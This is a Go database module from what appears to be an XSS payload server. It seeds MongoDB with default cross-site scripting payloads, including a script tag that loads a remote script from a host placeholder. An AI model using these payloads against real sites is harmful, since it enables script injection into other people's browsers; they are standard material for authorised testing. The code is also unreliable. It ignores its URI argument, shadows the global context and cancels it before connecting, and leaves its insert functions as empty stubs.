package database

import (
	"context"
	"fmt"
	"log"
	"time"
	"xsserve/core"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

var (
	client *mongo.Client
	CTX    context.Context
	DB     *mongo.Database
)

func Open(uri, database string) (err error) {
	client, err = mongo.NewClient(options.Client().ApplyURI("mongodb://localhost:27017")) //uri
	if err != nil {
		log.Println(err)
		return err
	}
	CTX, cancelFunction := context.WithTimeout(context.Background(), 10*time.Second)
	cancelFunction()
	err = client.Connect(CTX)
	if err != nil {
		log.Println(err)
		return err
	}

	err = initialize(database)
	return err
}

func initialize(database string) (err error) {
	DB = client.Database(database)
	//DB.CreateCollection(CTX, "payloads")
	//DB.CreateCollection(CTX, "triggers")

	payloadsColl := DB.Collection("payloads")

	count, err := payloadsColl.CountDocuments(CTX, bson.M{})
	if err != nil {
		return err
	}
	if count < 1 {
		log.Println("Adding basic payloads")
		payloads := []core.Payload{
			{Description: "As simple as it can get!", Code: "<script>alert(1)</script>"},
			{Description: "Simple attribute injection", Code: "\" onload=alert(1)"},
			{Description: "Attribute injection and tag escaping", Code: "\"><img src=x onerror=alert(1)>"},
			{Description: "Include remote script", Code: fmt.Sprintf("<script src='%v'></script>", "[[HOST_REPLACE_ME]]")},
		}

		for _, payload := range payloads {
			payload.ID = primitive.NewObjectID().Hex()
			log.Println("Inserted default payload: ", payload)
			payloadsColl.InsertOne(CTX, payload)

		}
	}

	DB.Collection("payloads")
	return err
}

func Close() {
	if client != nil && CTX != nil {
		client.Disconnect(CTX)
	}
}

func InsertPayload(*core.Payload) {}

func InsertTrigger(*core.Trigger) {}
